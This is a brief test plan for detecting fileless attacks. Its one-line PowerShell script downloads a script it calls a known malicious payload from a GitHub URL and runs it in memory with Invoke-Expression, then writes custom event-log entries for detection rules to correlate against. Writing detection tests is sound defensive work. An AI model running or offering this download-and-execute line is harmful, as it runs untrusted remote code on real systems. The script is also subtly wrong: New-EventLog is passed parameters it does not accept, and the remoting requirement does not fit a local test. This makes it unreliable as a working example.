# Fileless Attack Injection Test Plan

## Objective
Test injection of a fileless attack via PowerShell memory execution, then log the event for detection testing.

## Test Script (single line)
```powershell
$maliciousPath = 'https://raw.githubusercontent.com/patrickfav/evilpowershell/main/Invoke-Fileless.ps1'; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString($maliciousPath)); New-EventLog -Source 'TestApp' -LogName 'Application' -EntryType Error -Message 'Injected fileless payload!'; Write-EventLog -LogName Application -Source TestApp -EntryType Error -EventId 1001 -Message 'Fileless attack injected via memory execution.'
```

## Description
- Downloads the Evil PowerShell script from GitHub (known malicious payload)
- Executes it in-memory via `Invoke-Expression` (no file written to disk)
- Logs a custom error event under source `TestApp` for correlation with detection rules
- This simulates a fileless attack chain: download → execute → persistence/logging

## Notes
- Requires internet connectivity and PowerShell remoting enabled
- The downloaded script performs its own actions; this test captures the injection step only
- Use Sysmon/PowerShell logging to detect the `Invoke-Expression` call and subsequent process creation